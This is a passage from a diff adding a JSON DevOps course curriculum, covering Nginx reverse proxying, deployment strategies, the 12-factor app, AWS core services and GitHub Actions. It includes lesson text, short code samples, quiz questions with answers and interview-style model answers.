+          "prompt": "Your Express app behind Nginx logs every client IP as 127.0.0.1. What is the fix?",
+          "options": [
+            "Disable Nginx",
+            "Forward X-Forwarded-For from Nginx and enable `trust proxy` in Express",
+            "Use UDP instead of TCP",
+            "Set server_name to the client IP"
+          ],
+          "answer": 1,
+          "explanation": "The TCP peer is Nginx. Nginx must pass the original IP in a header and the app must be told to trust that header from its proxy."
+        },
+        {
+          "id": "devops-cloud-03-q07",
+          "type": "truefalse",
+          "prompt": "`systemctl reload nginx` applies new configuration without dropping active connections.",
+          "answer": true,
+          "explanation": "Reload starts new worker processes with the new config and gracefully retires old workers after they finish current requests."
+        },
+        {
+          "id": "devops-cloud-03-q08",
+          "type": "truefalse",
+          "prompt": "Running your Node.js service as root is fine as long as it listens on a port above 1024.",
+          "answer": false,
+          "explanation": "Port number is irrelevant to the risk. A compromised root process owns the whole machine; services should run as an unprivileged user."
+        },
+        {
+          "id": "devops-cloud-03-q09",
+          "type": "multi",
+          "prompt": "Select all that apply: which are common responsibilities of a reverse proxy like Nginx?",
+          "options": [
+            "TLS termination",
+            "Load balancing across app instances",
+            "Running database migrations",
+            "Response compression",
+            "Serving static files"
+          ],
+          "answers": [
+            0,
+            1,
+            3,
+            4
+          ],
+          "explanation": "TLS, load balancing, compression and static files are classic proxy duties. Database migrations are an application/deploy concern."
+        },
+        {
+          "id": "devops-cloud-03-q10",
+          "type": "fill",
+          "prompt": "Fill the blank: Before reloading Nginx you should validate the config with `sudo nginx ___`.",
+          "accept": [
+            "-t",
+            "-T"
+          ],
+          "explanation": "`nginx -t` tests syntax and referenced files; `-T` also dumps the full config. Reload only after a successful test."
+        },
+        {
+          "id": "devops-cloud-03-q11",
+          "type": "interview",
+          "prompt": "A production server is slow. Walk me through how you would investigate from an SSH session.",
+          "answer": "- `uptime` / `top` or `htop`: load average vs CPU count, which process uses CPU or memory.\n- `free -h`: is the box swapping? Memory pressure causes huge slowdowns.\n- `df -h` and `du`: a full disk breaks writes, logs and databases.\n- `iostat`/`vmstat`: high iowait points at disk.\n- `ss -s` / `ss -tanp`: connection counts, many TIME_WAIT or a pile of connections to the database.\n- `journalctl -u app` and Nginx error/access logs: errors, upstream timeouts, slow request times.\n- Check dependencies: database slow queries, external API latency.\n- Then correlate with dashboards (metrics, traces) and recent deploys, since 'what changed' is often the fastest path to the cause.",
+          "level": "beginner"
+        },
+        {
+          "id": "devops-cloud-03-q12",
+          "type": "interview",
+          "prompt": "Why put Nginx (or a load balancer) in front of a Node.js app instead of exposing Node on port 443 directly?",
+          "answer": "- TLS termination and certificate renewal handled in one battle-tested place.\n- Load balancing across multiple Node processes (Node is single threaded per process) and zero-downtime restarts by draining one upstream at a time.\n- Efficient static file serving, caching and gzip/brotli without spending Node's event loop.\n- Buffers slow clients so Node workers are not tied up (slowloris protection), plus request size limits and rate limiting.\n- Binding to ports below 1024 needs privileges; Node can stay on 3000 as an unprivileged user.\n- In cloud setups the same role is often played by an ALB, CloudFront or an ingress controller.",
+          "level": "intermediate"
+        },
+        {
+          "id": "devops-cloud-03-q13",
+          "type": "interview",
+          "prompt": "How would you deploy a new version of a Node app on a single VM with zero downtime?",
+          "answer": "- Run at least two app instances (ports 3000 and 3001) behind an Nginx upstream.\n- Deploy to one instance at a time: stop it (Nginx routes to the other; mark it `down` or rely on health/passive failure detection), update code, start it, verify a health endpoint, then do the other.\n- Make the app handle SIGTERM gracefully: stop accepting new connections, finish in-flight requests, then exit.\n- Alternatively use PM2 cluster mode `pm2 reload` or containers with a blue-green swap of the Nginx upstream followed by `nginx -s reload`.\n- Keep database migrations backward compatible so both versions can run simultaneously during the rollout.",
+          "level": "intermediate"
+        }
+      ],
+      "resources": [
+        {
+          "title": "Nginx - Reverse proxy guide",
+          "url": "https://docs.nginx.com/nginx/admin-guide/web-server/reverse-proxy/"
+        },
+        {
+          "title": "Nginx - WebSocket proxying",
+          "url": "https://nginx.org/en/docs/http/websocket.html"
+        },
+        {
+          "title": "systemd.service manual",
+          "url": "https://www.freedesktop.org/software/systemd/man/latest/systemd.service.html"
+        }
+      ]
+    },
+    {
+      "id": "devops-cloud-04-deploy-strategies",
+      "title": "Deployment Strategies, Hosting Choices and the 12-Factor App",
+      "level": "intermediate",
+      "summary": "Rolling, blue-green and canary deploys, when to pick Vercel/Netlify vs containers, and the 12-factor principles that make apps deployable.",
+      "estMinutes": 35,
+      "lesson": [
+        {
+          "heading": "Recreate and rolling deployments",
+          "body": "**Recreate**: stop all old instances, start new ones. Simple, but causes downtime. Acceptable for internal tools or when two versions must never run together.\n\n**Rolling update**: replace instances gradually (for example 25% at a time), waiting for each batch to pass health checks before continuing. This is the default in Kubernetes Deployments and ECS services.\n\n- Pros: no extra capacity needed beyond a small surge, no downtime.\n- Cons: for a while, old and new versions serve traffic simultaneously, so APIs and database schemas must be compatible across both. Rollback is another rolling update, so it is not instant.\n\nKubernetes controls the pace with `maxSurge` (extra pods allowed above desired) and `maxUnavailable` (pods allowed to be down)."
+        },
+        {
+          "heading": "Blue-green deployments",
+          "body": "Run two identical environments. **Blue** serves production; **green** gets the new version. After green passes smoke tests, switch the router (load balancer target group, DNS, or Kubernetes Service selector) so all traffic goes to green. Blue stays up as an instant rollback target.\n\n- Pros: near-instant cutover and rollback; you test the exact production environment before it receives users.\n- Cons: double the capacity during the switch; shared databases still require backward compatible migrations; long-lived connections (WebSockets) must be drained.\n\nGotcha: switching via DNS is slow and unreliable because clients cache records past their TTL. Prefer switching at the load balancer."
+        },
+        {
+          "heading": "Canary releases and progressive delivery",
+          "body": "A **canary** sends a small slice of real traffic (1%, then 5%, 25%, 100%) to the new version while watching error rate, latency and business metrics. If metrics degrade, traffic shifts back automatically.\n\n- Pros: limits blast radius; real user validation; can be automated (Argo Rollouts, Flagger, AWS CodeDeploy, Vercel/Cloudflare traffic splitting).\n- Cons: needs good observability to compare canary vs baseline; needs traffic-splitting infrastructure; sticky sessions may be required so a user does not bounce between versions.\n\n**Feature flags** achieve a similar effect at the code level: the deploy is complete, but the feature is enabled for a percentage of users. **A/B testing** splits traffic to measure product impact, which is a business experiment rather than a safety mechanism.\n\n**Shadow (mirrored) traffic** copies production requests to the new version without returning its responses, which is useful for testing performance of a rewrite."
+        },
+        {
+          "heading": "Vercel/Netlify vs containers",
+          "body": "**Platforms like Vercel and Netlify** take a Git repo, build it, and deploy static assets to a CDN plus serverless/edge functions. You get preview deployments per PR, instant rollbacks, global CDN and zero server management. Vercel is the reference platform for Next.js (ISR, image optimization, middleware, streaming work out of the box).\n\nTrade-offs: functions have execution time and memory limits, cold starts, no long-lived processes (no in-process WebSocket servers or background workers), usage-based pricing that can spike, and some vendor lock-in.\n\n**Containers** (ECS/Fargate, Cloud Run, Kubernetes, Fly.io, a VM with Docker) run your app as a long-lived process. You control runtime, networking and cost profile, and can run WebSockets, queues and cron workers. In exchange you own scaling, patching, TLS and observability setup.\n\nRule of thumb: a Next.js frontend plus light APIs fits Vercel/Netlify well. Heavy backends, persistent connections, long jobs, strict data residency or predictable high traffic often favor containers. Many teams combine both: Next.js on Vercel and an API plus workers in containers."
+        },
+        {
+          "heading": "The 12-factor app",
+          "body": "The **Twelve-Factor App** methodology (from Heroku engineers) describes apps that deploy cleanly to any modern platform:\n\n- **I Codebase**: one repo per app, many deploys.\n- **II Dependencies**: declare explicitly (package.json + lockfile), never rely on system packages.\n- **III Config**: store config in the environment, not in code.\n- **IV Backing services**: databases, queues and caches are attached resources swapped via config (a URL).\n- **V Build, release, run**: strictly separate stages; a release = build + config.\n- **VI Processes**: stateless, share-nothing processes; state lives in backing services.\n- **VII Port binding**: the app exports HTTP by binding to a port.\n- **VIII Concurrency**: scale out by running more processes.\n- **IX Disposability**: fast startup, graceful shutdown on SIGTERM.\n- **X Dev/prod parity**: keep environments similar.\n- **XI Logs**: treat logs as event streams written to stdout.\n- **XII Admin processes**: run one-off tasks (migrations) as processes with the same code and config.\n\nStateless processes are what make rolling, blue-green and autoscaling work: any instance can be killed or added at any time.",
+          "code": {
+            "lang": "typescript",
+            "source": "// Factor III + IX: config from env, graceful shutdown\nconst port = Number(process.env.PORT ?? 3000);\nconst server = app.listen(port, () => console.log(`listening on ${port}`));\n\nprocess.on(\"SIGTERM\", () => {\n  console.log(\"SIGTERM received, draining\");\n  server.close(async () => {\n    await db.end();          // close pools\n    process.exit(0);\n  });\n  setTimeout(() => process.exit(1), 25_000).unref(); // hard stop\n});"
+          }
+        },
+        {
+          "heading": "Database migrations during deploys",
+          "body": "Every strategy except recreate runs two versions at once, so schema changes must use **expand and contract** (also called parallel change):\n\n- **Expand**: add the new column/table in a backward compatible way (nullable or with a default). Old code ignores it.\n- **Migrate**: deploy code that writes to both old and new, backfill existing rows, then switch reads to the new column.\n- **Contract**: once no running version uses the old column, drop it in a later deploy.\n\nRenaming a column in one step breaks the old version mid-rollout and makes rollback impossible. Run migrations as a separate pipeline step or job (12-factor admin process), not at app startup across many replicas racing each other."
+        }
+      ],
+      "keyPoints": [
+        "Rolling updates replace instances in batches; old and new versions overlap.",
+        "Blue-green keeps two full environments and switches traffic at the router for instant rollback.",
+        "Canary shifts a small percentage of traffic first and promotes or aborts based on metrics.",
+        "Switch traffic at the load balancer, not via DNS, because DNS caching delays cutover.",
+        "Vercel/Netlify excel at frontends and previews; containers suit long-lived processes, WebSockets and workers.",
+        "12-factor: config in env, stateless processes, logs to stdout, graceful shutdown, build/release/run separation.",
+        "Use expand-and-contract migrations so two app versions can share a schema."
+      ],
+      "questions": [
+        {
+          "id": "devops-cloud-04-q01",
+          "type": "mcq",
+          "prompt": "Which strategy gives the fastest rollback by keeping the previous full environment running?",
+          "options": [
+            "Recreate",
+            "Rolling update",
+            "Blue-green",
+            "Shadow traffic"
+          ],
+          "answer": 2,
+          "explanation": "In blue-green the old environment stays live and idle; rollback is just switching the router back."
+        },
+        {
+          "id": "devops-cloud-04-q02",
+          "type": "mcq",
+          "prompt": "A team wants to send 5% of users to a new version and auto-abort if the error rate rises. Which strategy is this?",
+          "options": [
+            "Blue-green",
+            "Canary",
+            "Recreate",
+            "Big bang"
+          ],
+          "answer": 1,
+          "explanation": "Canary releases expose a small slice of traffic and use metrics to decide promotion or rollback."
+        },
+        {
+          "id": "devops-cloud-04-q03",
+          "type": "mcq",
+          "prompt": "In a Kubernetes rolling update with 10 replicas, `maxSurge: 2` and `maxUnavailable: 0`, what is true?",
+          "options": [
+            "Up to 12 pods may exist and never fewer than 10 are available",
+            "Only 2 pods are updated in total",
+            "The deployment may drop to 8 pods",
+            "All 10 pods are replaced at once"
+          ],
+          "answer": 0,
+          "explanation": "maxSurge allows 2 extra pods above desired; maxUnavailable 0 means available pods never drop below 10 during the rollout."
+        },
+        {
+          "id": "devops-cloud-04-q04",
+          "type": "mcq",
+          "prompt": "Why is a single-step column rename dangerous in a rolling deploy?",
+          "options": [
+            "SQL does not support renames",
+            "Old instances still running during the rollout query the old column name and fail, and rollback breaks",
+            "It locks the CDN",
+            "Renames are only slow, never dangerous"
+          ],
+          "answer": 1,
+          "explanation": "Rolling deploys overlap versions. Use expand and contract: add the new column, dual write, backfill, switch reads, drop later."
+        },
+        {
+          "id": "devops-cloud-04-q05",
+          "type": "mcq",
+          "prompt": "Which workload is the worst fit for Vercel serverless functions?",
+          "options": [
+            "A Next.js marketing site with ISR",
+            "A REST endpoint that returns user profile JSON",
+            "A long-running WebSocket chat server holding thousands of persistent connections",
+            "Preview deployments for PRs"
+          ],
+          "answer": 2,
+          "explanation": "Serverless functions are short-lived and request scoped. Persistent connection servers need long-lived processes (containers) or a managed realtime service."
+        },
+        {
+          "id": "devops-cloud-04-q06",
+          "type": "mcq",
+          "prompt": "According to the 12-factor app, where should database credentials live?",
+          "options": [
+            "In a config.ts committed to the repo",
+            "In environment variables (injected from a secret store)",
+            "Hardcoded in the Docker image",
+            "In the README"
+          ],
+          "answer": 1,
+          "explanation": "Factor III: config that varies per deploy, especially credentials, belongs in the environment, not the codebase or the build artifact."
+        },
+        {
+          "id": "devops-cloud-04-q07",
+          "type": "truefalse",
+          "prompt": "Switching traffic via DNS is the most reliable way to do an instant blue-green cutover.",
+          "answer": false,
+          "explanation": "Resolvers and clients cache DNS beyond TTLs, so some users keep hitting the old environment. Switching at the load balancer is immediate."
+        },
+        {
+          "id": "devops-cloud-04-q08",
+          "type": "truefalse",
+          "prompt": "A 12-factor app writes logs to stdout and lets the platform route them.",
+          "answer": true,
+          "explanation": "Factor XI treats logs as event streams. The app does not manage log files; the execution environment collects and ships stdout."
+        },
+        {
+          "id": "devops-cloud-04-q09",
+          "type": "multi",
+          "prompt": "Select all that apply: which are required for stateless, horizontally scalable app processes?",
+          "options": [
+            "Sessions stored in Redis or a signed cookie, not in process memory",
+            "Uploaded files saved to object storage like S3, not local disk",
+            "Sticky sessions as the only way to keep users logged in",
+            "Graceful handling of SIGTERM",
+            "Writing cron state to a local file"
+          ],
+          "answers": [
+            0,
+            1,
+            3
+          ],
+          "explanation": "State must live in backing services so any instance can be removed or added. Local files and memory-only sessions tie users to instances."
+        },
+        {
+          "id": "devops-cloud-04-q10",
+          "type": "fill",
+          "prompt": "Fill the blank: The migration pattern 'add new column, dual write, backfill, switch reads, drop old column' is called expand and ___.",
+          "accept": [
+            "contract"
+          ],
+          "explanation": "Expand and contract (parallel change) keeps every intermediate schema compatible with both app versions."
+        },
+        {
+          "id": "devops-cloud-04-q11",
+          "type": "interview",
+          "prompt": "Compare rolling, blue-green and canary deployments. When would you use each?",
+          "answer": "- Rolling: gradual replacement with health checks, no extra environment. Default for stateless services on Kubernetes/ECS. Rollback is slow-ish (another rollout) and versions overlap.\n- Blue-green: full parallel environment, atomic switch at the load balancer, instant rollback. Good when you need to validate the full stack before cutover or when overlap of versions in traffic is undesirable. Costs double capacity briefly.\n- Canary: progressive traffic shifting guided by metrics. Best for high-traffic, high-risk services where you want to limit blast radius and have solid observability.\n- All three need backward-compatible schema changes. Feature flags complement them by controlling release separately from deploy.",
+          "level": "intermediate"
+        },
+        {
+          "id": "devops-cloud-04-q12",
+          "type": "interview",
+          "prompt": "Your team runs a Next.js app with a Node API and background jobs. Would you deploy on Vercel or containers?",
+          "answer": "- I would split by workload. The Next.js frontend fits Vercel: preview deploys, CDN, ISR and instant rollback with no ops cost.\n- The API could live in Next.js route handlers on Vercel if requests are short and stateless.\n- Background jobs, queues, WebSockets and long-running work go to containers (ECS Fargate, Cloud Run, Fly) or managed services (SQS + Lambda, a hosted queue) because serverless functions have time limits and no persistent process.\n- Decision factors: traffic pattern and cost at scale, latency to the database (functions in the same region as the DB), connection pooling (serverless needs a pooler like PgBouncer or a data proxy), compliance/data residency, and team ops maturity.",
+          "level": "intermediate"
+        },
+        {
+          "id": "devops-cloud-04-q13",
+          "type": "interview",
+          "prompt": "Which of the 12 factors are violated most often in Node apps, and how do you fix them?",
+          "answer": "- Config in code: `.env` committed or per-environment config files. Fix: env vars validated at startup (zod), secrets from a manager.\n- Stateful processes: in-memory sessions, local file uploads, in-process cron. Fix: Redis/DB sessions, S3 uploads, a scheduler or queue.\n- Disposability: no SIGTERM handling, so deploys cut requests. Fix: close the server, drain, close pools, exit within the grace period.\n- Logs: writing to files with rotation in-app. Fix: structured JSON to stdout.\n- Admin processes: migrations run at startup by every replica. Fix: a one-off migration job in the pipeline.\n- Dev/prod parity: SQLite locally, Postgres in prod. Fix: run real services locally via docker compose.",
+          "level": "intermediate"
+        }
+      ],
+      "resources": [
+        {
+          "title": "The Twelve-Factor App",
+          "url": "https://12factor.net/"
+        },
+        {
+          "title": "Martin Fowler - Blue Green Deployment",
+          "url": "https://martinfowler.com/bliki/BlueGreenDeployment.html"
+        },
+        {
+          "title": "Martin Fowler - Canary Release",
+          "url": "https://martinfowler.com/bliki/CanaryRelease.html"
+        }
+      ]
+    },
+    {
+      "id": "devops-cloud-05-aws-core",
+      "title": "AWS Core Services",
+      "level": "intermediate",
+      "summary": "IAM, VPC, EC2, S3, RDS, Lambda and CloudFront: what each does, how they fit together, and the traps interviewers ask about.",
+      "estMinutes": 40,
+      "lesson": [
+        {
+          "heading": "IAM: identity and access first",
+          "body": "**IAM** controls who can do what in your AWS account. Key concepts:\n\n- **Users**: long-term identities for humans (prefer SSO via IAM Identity Center instead).\n- **Roles**: identities assumed temporarily by services (EC2, Lambda, ECS tasks) or federated identities (GitHub Actions via OIDC). They issue short-lived credentials.\n- **Policies**: JSON documents with `Effect`, `Action`, `Resource` and optional `Condition`.\n\nEvaluation: everything is denied by default; an explicit `Allow` grants access; an explicit `Deny` always wins.\n\nBest practices: never use the root account for daily work (enable MFA and lock it away), apply least privilege, use roles instead of access keys on servers, and never commit access keys. Leaked keys on GitHub are found by bots within minutes.",
+          "code": {
+            "lang": "json",
+            "source": "{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": [\"s3:GetObject\", \"s3:PutObject\"],\n      \"Resource\": \"arn:aws:s3:::my-app-uploads/*\"\n    }\n  ]\n}"
+          }
+        },
+        {
+          "heading": "Networking: regions, AZs and VPC",
+          "body": "A **region** (for example `us-east-1`, `ap-south-1`) is a geographic area made of multiple isolated **Availability Zones** (AZs), each one or more data centers. Spread instances across at least two AZs for high availability.\n\nA **VPC** is your private network. It contains **subnets**, each in one AZ:\n\n- **Public subnets** have a route to an Internet Gateway; load balancers live here.\n- **Private subnets** have no direct inbound internet route; app servers and databases live here. Outbound internet (to call APIs or pull packages) goes through a **NAT Gateway**.\n\n**Security groups** are stateful virtual firewalls attached to resources (allow rules only). A common pattern: the database security group allows port 5432 only from the app's security group. **Network ACLs** are stateless subnet-level rules and are used less often."
+        },
+        {
+          "heading": "Compute: EC2, containers and Lambda",
+          "body": "**EC2** gives you virtual machines. You choose an instance type (for example `t4g.small`, `m7i.large`), an AMI (OS image) and storage (EBS volumes). Put instances in an **Auto Scaling Group** behind an **Application Load Balancer (ALB)** to scale out and replace unhealthy instances. Pricing: on-demand, Savings Plans/Reserved (commit for discounts), Spot (up to ~90% cheaper but can be reclaimed with 2 minutes notice).\n\n**ECS/Fargate** runs containers without managing servers; **EKS** is managed Kubernetes.\n\n**Lambda** runs functions on demand, billed per request and per millisecond of execution. Max timeout is 15 minutes. It scales automatically, but watch for:\n\n- **Cold starts** when a new execution environment initializes (mitigate with smaller bundles, provisioned concurrency or SnapStart where supported).\n- **Database connection storms**: thousands of concurrent Lambdas each opening Postgres connections. Use RDS Proxy or a pooler.\n- Concurrency limits per account and region.\n\nLambda pairs naturally with event sources: API Gateway, S3 events, SQS, EventBridge schedules."
+        },
+        {
+          "heading": "Storage and databases: S3 and RDS",
+          "body": "**S3** is object storage: buckets contain objects addressed by key, with 11 nines of durability. Use it for uploads, static assets, backups and data lakes. Key facts:\n\n- Block Public Access is on by default for new buckets; keep it on and serve public content via CloudFront.\n- **Presigned URLs** let browsers upload or download directly to S3 for a limited time without your server proxying bytes.\n- Storage classes (Standard, Intelligent-Tiering, Glacier) and lifecycle rules control cost.\n- S3 provides strong read-after-write consistency for all operations.\n\n**RDS** is managed relational databases (Postgres, MySQL, MariaDB, SQL Server, Oracle); **Aurora** is AWS's cloud-native MySQL/Postgres-compatible engine. RDS handles backups, patching and failover.\n\n- **Multi-AZ** = synchronous standby in another AZ for **high availability** (automatic failover). The standby does not serve reads in the classic setup.\n- **Read replicas** = asynchronous copies for **read scaling** (and can be promoted). They can lag.\n\nAlso know DynamoDB (serverless key-value/document store) and ElastiCache (managed Redis/Valkey/Memcached).",
+          "code": {
+            "lang": "typescript",
+            "source": "// Presigned upload URL (AWS SDK v3)\nimport { S3Client, PutObjectCommand } from \"@aws-sdk/client-s3\";\nimport { getSignedUrl } from \"@aws-sdk/s3-request-presigner\";\n\nconst s3 = new S3Client({ region: \"us-east-1\" });\n\nexport async function createUploadUrl(userId: string, fileName: string) {\n  const key = `uploads/${userId}/${crypto.randomUUID()}-${fileName}`;\n  const url = await getSignedUrl(\n    s3,\n    new PutObjectCommand({ Bucket: \"my-app-uploads\", Key: key, ContentType: \"image/png\" }),\n    { expiresIn: 300 } // seconds\n  );\n  return { url, key };\n}"
+          }
+        },
+        {
+          "heading": "CloudFront and a reference architecture",
+          "body": "**CloudFront** is AWS's CDN. It caches content at edge locations near users, terminates TLS (certificates from ACM, which must be in `us-east-1` for CloudFront), and can front S3 buckets (using Origin Access Control so the bucket stays private) or dynamic origins like an ALB. Cache behavior is controlled by cache policies and `Cache-Control` headers; invalidations purge paths after a deploy, though content-hashed file names avoid needing them.\n\nA typical full stack architecture on AWS:\n\n- Route 53 DNS -> CloudFront -> S3 (static frontend) and ALB (API paths).\n- ALB in public subnets -> ECS Fargate tasks or EC2 Auto Scaling Group in private subnets across 2-3 AZs.\n- RDS Postgres Multi-AZ and ElastiCache Redis in private subnets.\n- S3 for uploads via presigned URLs; SQS + Lambda for async jobs.\n- IAM roles per service, secrets in Secrets Manager or SSM Parameter Store, logs and metrics in CloudWatch."
+        }
+      ],
+      "keyPoints": [
+        "IAM: default deny, explicit allow, explicit deny always wins; use roles and short-lived credentials, not keys.",
+        "Spread resources across multiple AZs; keep app servers and databases in private subnets.",
+        "Security groups are stateful allow-lists; reference other security groups instead of IP ranges.",
+        "Lambda: up to 15 min, pay per use, watch cold starts and DB connection storms (use RDS Proxy).",
+        "S3: private by default, presigned URLs for direct browser upload/download, lifecycle rules for cost.",
+        "RDS Multi-AZ is for availability; read replicas are for read scaling.",
+        "CloudFront caches at the edge and fronts private S3 buckets with Origin Access Control."
+      ],
+      "questions": [
+        {
+          "id": "devops-cloud-05-q01",
+          "type": "mcq",
+          "prompt": "An IAM policy allows `s3:*` on a bucket, and another attached policy explicitly denies `s3:DeleteObject`. Can the principal delete objects?",
+          "options": [
+            "Yes, Allow is evaluated first",
+            "No, an explicit Deny always overrides Allow",
+            "Only with MFA",
+            "It depends on the region"
+          ],
+          "answer": 1,
+          "explanation": "IAM evaluation: explicit deny > explicit allow > implicit deny. Any matching Deny blocks the action."
+        },
+        {
+          "id": "devops-cloud-05-q02",
+          "type": "mcq",
+          "prompt": "What is the main purpose of RDS Multi-AZ?",
+          "options": [
+            "Scaling read traffic",
+            "High availability via a synchronous standby with automatic failover",
+            "Cheaper storage",
+            "Cross-region disaster recovery only"
+          ],
+          "answer": 1,
+          "explanation": "Multi-AZ keeps a synchronous standby in another AZ and fails over automatically. Read scaling is the job of read replicas."
+        },
+        {
+          "id": "devops-cloud-05-q03",
+          "type": "mcq",
+          "prompt": "Users upload 500 MB videos through your Node API to S3 and the API servers are overwhelmed. Best fix?",
+          "options": [
+            "Bigger EC2 instances",
+            "Have the API issue presigned URLs so browsers upload directly to S3",
+            "Store videos in RDS",
+            "Increase the Nginx body size limit"
+          ],
+          "answer": 1,
+          "explanation": "Presigned URLs authorize a time-limited direct upload, removing the API from the data path entirely (use multipart upload for large files)."
+        },
+        {
+          "id": "devops-cloud-05-q04",
+          "type": "mcq",
+          "prompt": "A Lambda function connecting to RDS Postgres causes 'too many connections' errors during traffic spikes. What helps most?",
+          "options": [
+            "Increase Lambda memory",
+            "Use RDS Proxy (or another connection pooler) between Lambda and the database",
+            "Move Lambda to a public subnet",
+            "Lower the Lambda timeout to 1 second"
+          ],
+          "answer": 1,
+          "explanation": "Each concurrent Lambda environment opens its own connections. RDS Proxy pools and multiplexes them so the database sees a bounded number."
+        },
+        {
+          "id": "devops-cloud-05-q05",
+          "type": "mcq",
+          "prompt": "Where should an application's Postgres database be placed in a VPC?",
+          "options": [
+            "A public subnet with a public IP",
+            "A private subnet, with a security group allowing 5432 only from the app's security group",
+            "Outside the VPC",
+            "In the same subnet as the Internet Gateway with port 5432 open to 0.0.0.0/0"
+          ],
+          "answer": 1,
+          "explanation": "Databases should not be reachable from the internet. Security group references restrict access to exactly the app tier."
+        },
+        {
+          "id": "devops-cloud-05-q06",
+          "type": "mcq",
+          "prompt": "What is the maximum execution timeout for an AWS Lambda function?",
+          "options": [
+            "30 seconds",
+            "5 minutes",
+            "15 minutes",
+            "1 hour"
+          ],
+          "answer": 2,
+          "explanation": "Lambda caps execution at 900 seconds (15 minutes). Longer work belongs in Step Functions, ECS/Fargate tasks or batch jobs."
+        },
+        {
+          "id": "devops-cloud-05-q07",
+          "type": "truefalse",
+          "prompt": "EC2 instances should get AWS credentials through an IAM role (instance profile) rather than access keys stored on disk.",
+          "answer": true,
+          "explanation": "Roles deliver automatically rotated temporary credentials via the instance metadata service; static keys can leak and never expire."
+        },
+        {
+          "id": "devops-cloud-05-q08",
+          "type": "truefalse",
+          "prompt": "Security groups are stateless, so you must add rules for both inbound requests and their outbound responses.",
+          "answer": false,
+          "explanation": "Security groups are stateful: return traffic for an allowed connection is automatically permitted. Network ACLs are the stateless ones."
+        },
+        {
+          "id": "devops-cloud-05-q09",
+          "type": "multi",
+          "prompt": "Select all that apply: which are good uses of S3?",
+          "options": [
+            "User uploaded images",
+            "Static site assets behind CloudFront",
+            "A relational database with transactions",
+            "Database backups and logs archive",
+            "A low-latency lock service"
+          ],
+          "answers": [
+            0,
+            1,
+            3
+          ],
+          "explanation": "S3 is object storage for blobs, assets and archives. It is not a transactional database or a locking service."
+        },
+        {
+          "id": "devops-cloud-05-q10",
+          "type": "fill",
+          "prompt": "Fill the blank: A temporary, signed S3 link that lets a client upload or download one object without AWS credentials is called a ___ URL.",
+          "accept": [
+            "presigned",
+            "pre-signed",
+            "signed"
+          ],
+          "explanation": "Presigned URLs embed a signature generated from the server's credentials and expire after a set time."
+        },
+        {
+          "id": "devops-cloud-05-q11",
+          "type": "interview",
+          "prompt": "Design a highly available AWS architecture for a typical full stack web app (React/Next.js frontend, Node API, Postgres).",
+          "answer": "- DNS in Route 53, TLS certs from ACM.\n- Frontend: static build in a private S3 bucket behind CloudFront (Origin Access Control), or Next.js on Amplify/Vercel/containers if SSR is needed.\n- API: ECS Fargate service (or EC2 Auto Scaling Group) in private subnets across at least 2 AZs, behind an ALB in public subnets; health checks and autoscaling on CPU/request count.\n- Data: RDS/Aurora Postgres Multi-AZ, read replicas if read heavy; ElastiCache Redis for caching and sessions.\n- Async: SQS queues consumed by workers or Lambda; S3 presigned uploads.\n- Security: IAM roles per task, Secrets Manager for credentials, security groups chained ALB -> app -> DB, WAF on CloudFront/ALB.\n- Ops: CloudWatch logs/metrics/alarms, automated backups with point-in-time recovery, infrastructure defined in Terraform/CDK.",
+          "level": "intermediate"
+        },
+        {
+          "id": "devops-cloud-05-q12",
+          "type": "interview",
+          "prompt": "When would you choose Lambda over ECS Fargate or EC2?",
+          "answer": "- Lambda: spiky or low, unpredictable traffic; event-driven glue (S3 events, SQS consumers, cron via EventBridge); short work under 15 minutes; teams wanting zero server management. Pay nothing when idle.\n- Fargate/EC2: steady high traffic (cheaper per request at sustained load), long-running processes, WebSockets, heavy CPU/memory, custom runtimes, need for connection pooling or in-memory caches, or latency-sensitive paths where cold starts hurt.\n- Also consider: Lambda's concurrency limits, DB connection handling (RDS Proxy), local dev/testing story, and vendor lock-in. Many systems mix both: API on Fargate, async jobs on Lambda.",
+          "level": "intermediate"
+        },
+        {
+          "id": "devops-cloud-05-q13",
+          "type": "interview",
+          "prompt": "An AWS access key was accidentally pushed to a public GitHub repo. What do you do?",
+          "answer": "- Immediately deactivate and delete the key in IAM (assume it is already compromised; scanners find keys in minutes). Removing it from Git history is not enough.\n- Check CloudTrail for activity using that key: new users, roles, EC2 instances in unusual regions (crypto mining), S3 data access.\n- Revoke any resources or credentials the attacker created; check billing.\n- Rotate other secrets that may be exposed alongside it.\n- Prevent recurrence: replace long-lived keys with roles/OIDC, enable GitHub secret scanning and push protection, add pre-commit scanners (gitleaks), and use least-privilege policies so any future leak has limited blast radius.",
+          "level": "advanced"
+        }
+      ],
+      "resources": [
+        {
+          "title": "AWS IAM best practices",
+          "url": "https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html"
+        },
+        {
+          "title": "Amazon S3 presigned URLs",
+          "url": "https://docs.aws.amazon.com/AmazonS3/latest/userguide/using-presigned-url.html"
+        },
+        {
+          "title": "AWS Well-Architected Framework",
+          "url": "https://aws.amazon.com/architecture/well-architected/"
+        }
+      ]
+    },
+    {
+      "id": "devops-cloud-06-actions-advanced",
+      "title": "GitHub Actions: Matrix, Caching, Secrets and Deploys",
+      "level": "intermediate",
+      "summary": "Scale workflows with matrices and caching, manage secrets and environments, and deploy to the cloud with OIDC instead of stored keys.",
+      "estMinutes": 35,
+      "lesson": [
+        {
+          "heading": "Matrix builds",
+          "body": "A **matrix** runs the same job across combinations of variables, for example several Node versions and operating systems. Each combination becomes a separate parallel job.\n\n- `fail-fast` (default `true`) cancels remaining matrix jobs when one fails. Set `false` when you want the full picture.\n- `max-parallel` limits concurrency.\n- `include` adds extra combinations or variables; `exclude` removes combinations.\n\nMatrices are also useful for **test sharding**: split a slow suite into N shards with `matrix.shard: [1, 2, 3, 4]` and pass `--shard=${{ matrix.shard }}/4` to Jest or Playwright.",
+          "code": {
+            "lang": "yaml",
+            "source": "jobs:\n  test:\n    runs-on: ${{ matrix.os }}\n    strategy:\n      fail-fast: false\n      matrix:\n        os: [ubuntu-latest, windows-latest]\n        node: [20, 22, 24]\n        exclude:\n          - os: windows-latest\n            node: 20\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: ${{ matrix.node }}\n          cache: npm\n      - run: npm ci\n      - run: npm test"
+          }
+        },
+        {
+          "heading": "Caching dependencies and builds",
